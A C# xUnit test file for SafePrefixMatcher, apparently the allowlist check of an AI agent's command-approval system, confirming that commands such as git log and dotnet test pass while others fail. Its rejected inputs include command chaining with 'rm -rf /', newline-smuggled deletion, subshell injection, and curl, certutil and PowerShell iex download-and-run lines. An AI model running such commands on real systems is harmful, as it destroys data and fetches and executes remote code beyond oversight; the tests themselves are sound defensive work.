using OpenDynamic.Core.AgentApprovals;
using Xunit;

namespace OpenDynamic.Tests.AgentApprovals;

public class SafePrefixMatcherTests
{
    [Theory]
    [InlineData("git status")]
    [InlineData("git diff")]
    [InlineData("git log")]
    [InlineData("dotnet build")]
    [InlineData("dotnet test")]
    [InlineData("ls")]
    [InlineData("dir")]
    public void EvaluateCandidate_ExactPrefixCommand_ReturnsCandidate(string cmd)
    {
        var (isCandidate, matchedPrefix) = SafePrefixMatcher.EvaluateCandidate(cmd);
        Assert.True(isCandidate);
        Assert.Equal(cmd, matchedPrefix);
    }

    [Theory]
    [InlineData("git log --oneline -n 5", "git log")]
    [InlineData("git diff --stat HEAD", "git diff")]
    [InlineData("dotnet build -c Release /p:TreatWarningsAsErrors=true", "dotnet build")]
    [InlineData("dotnet test --filter Category=Unit", "dotnet test")]
    [InlineData("ls -la /src/OpenDynamic", "ls")]
    [InlineData("dir C:\\Users\\Pcrz /b", "dir")]
    public void EvaluateCandidate_PrefixWithBenignArgs_ReturnsCandidate(string fullCmd, string expectedPrefix)
    {
        var (isCandidate, matchedPrefix) = SafePrefixMatcher.EvaluateCandidate(fullCmd);
        Assert.True(isCandidate);
        Assert.Equal(expectedPrefix, matchedPrefix);
    }

    [Theory]
    [InlineData("git logging")]
    [InlineData("git statusbar")]
    [InlineData("director")]
    [InlineData("lsof")]
    public void EvaluateCandidate_TokenBoundary_NonMatchingPrefix_ReturnsFalse(string invalidCmd)
    {
        var (isCandidate, _) = SafePrefixMatcher.EvaluateCandidate(invalidCmd);
        Assert.False(isCandidate);
    }

    [Theory]
    [InlineData("git log; rm -rf /")]
    [InlineData("git log && calc.exe")]
    [InlineData("git log || echo fail")]
    [InlineData("git diff | grep foo")]
    public void EvaluateCandidate_ForbiddenChaining_ReturnsFalse(string chainedCmd)
    {
        var (isCandidate, _) = SafePrefixMatcher.EvaluateCandidate(chainedCmd);
        Assert.False(isCandidate);
    }

    [Theory]
    [InlineData("git log > output.txt")]
    [InlineData("git log < input.txt")]
    [InlineData("git log $(whoami)")]
    [InlineData("git log `dir`")]
    [InlineData("git log \n rm -rf .")]
    public void EvaluateCandidate_RedirectionAndSubshells_ReturnsFalse(string dangerousCmd)
    {
        var (isCandidate, _) = SafePrefixMatcher.EvaluateCandidate(dangerousCmd);
        Assert.False(isCandidate);
    }

    [Theory]
    [InlineData("powershell -Command Get-Process")]
    [InlineData("pwsh -c ls")]
    [InlineData("cmd.exe /c echo hello")]
    [InlineData("bash -c date")]
    [InlineData("wsl ls -la")]
    [InlineData("python test.py")]
    [InlineData("node index.js")]
    public void EvaluateCandidate_ExcludedShells_ReturnsFalse(string shellCmd)
    {
        var (isCandidate, _) = SafePrefixMatcher.EvaluateCandidate(shellCmd);
        Assert.False(isCandidate);
    }

    [Theory]
    [InlineData("curl https://example.com/payload.sh")]
    [InlineData("wget https://example.com/file")]
    [InlineData("certutil -urlcache -split -f https://example.com")]
    [InlineData("iex (New-Object Net.WebClient).DownloadString('http://...')")]
    public void EvaluateCandidate_ExcludedDownloaders_ReturnsFalse(string downloaderCmd)
    {
        var (isCandidate, _) = SafePrefixMatcher.EvaluateCandidate(downloaderCmd);
        Assert.False(isCandidate);
    }

    [Fact]
    public void MatchesRule_BenignArgs_Matches()
    {
        bool matches = SafePrefixMatcher.MatchesRule("git log --oneline -n 10", "git log", RiskLevel.Low);
        Assert.True(matches);
    }

    [Fact]
    public void MatchesRule_DangerousArgs_DoesNotMatch()
    {
        bool matches = SafePrefixMatcher.MatchesRule("git log; rm file", "git log", RiskLevel.Low);
        Assert.False(matches);
    }

    [Fact]
    public void MatchesRule_HighRisk_NeverMatches()
    {
        bool matches = SafePrefixMatcher.MatchesRule("git log --oneline", "git log", RiskLevel.High);
        Assert.False(matches);
    }

    [Fact]
    public void CustomWhitelist_Respected()
    {
        string[] custom = ["cargo test", "npm test"];
        var (isCandidate, prefix) = SafePrefixMatcher.EvaluateCandidate("cargo test -- --nocapture", custom);
        Assert.True(isCandidate);
        Assert.Equal("cargo test", prefix);

        var (notCandidate, _) = SafePrefixMatcher.EvaluateCandidate("git status", custom);
        Assert.False(notCandidate);
    }
}
